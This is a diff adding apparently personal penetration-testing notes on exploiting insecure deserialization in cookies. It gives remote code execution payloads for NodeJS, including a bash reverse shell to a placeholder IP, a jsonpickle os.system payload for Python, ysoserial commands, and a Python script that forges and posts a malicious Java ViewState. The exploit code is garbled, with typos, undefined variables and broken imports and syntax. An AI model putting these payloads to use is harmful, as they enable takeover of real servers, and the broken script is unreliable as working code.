@@ -1,0 +1,53 @@
+when I captured the request via Burp and I spotted custom made cookies that carry information in the form of a dictionary are being passed e.g { key1:value1, key2:value2 … }
+Then this is a perfect opportunity for Insecure serialization/deserialization
+ 
+
+NodeJs (if application written)
+{key1:”_$$ND_FUNC$$_function(){return require(‘child_process’).execSync(‘<cmd>’,(e,out.err)=>{console.log(out);}); }()”}
+
+{key1:”_$$\u004e\u0044_FUNC$$_\u0066unction(){require(‘child_process’).exec(\”bash -c ‘bash -i >& /dev/tcp/<ip>/<port> 0&1’ \”,function(error,stdout,stderr){console.log(stdout)});}()”}
+
+Python (if application written)
+{"py/object":"__main__.Shell","py/reduce":[{"py/function":"os.system"},["<cmd>"], 0, 0, 0]}
+
+.NET (if application written)
+Using ysoserial.net with different options
+
+
+Java  ( requires: decryption key)
+
+default hash is sha1
+default encryption algorithm is DES
+     -look for “ViewState”
+
+use ysoserial to generate payload
+
+java -jar ysoserial.jar CommonsCollection5 “<payload>”  > payload.bin
+
+
+to exploit this vulnerability, use the following python code
+
+from base64 import b64decode,b64encode
+from hashlib import sha1
+import hmac,sha1
+
+def create_payload()
+   payload=open(payload.bin,”rb”)
+  return encrypt_payload(payload)
+
+
+def encrypt_payload(payload):
+   key=b64decode(“<encryptioon_key>”)
+   obj=pyDes.dec(key,pyDes.ECB,padmode=pyDes.PAD_PKCS5)
+   dec=obj.encrypt(payload)
+   hash_value=(hmac.new(key,bytes(enc),sha1).digest())
+   payload=enc+hash_value
+   return payload
+
+def exploitation():
+  malicous_view_state=create_payload()
+  data={“view_state”:malicious_view_state}
+  resquests.post(url,data=data)
+
+
+exploitation()
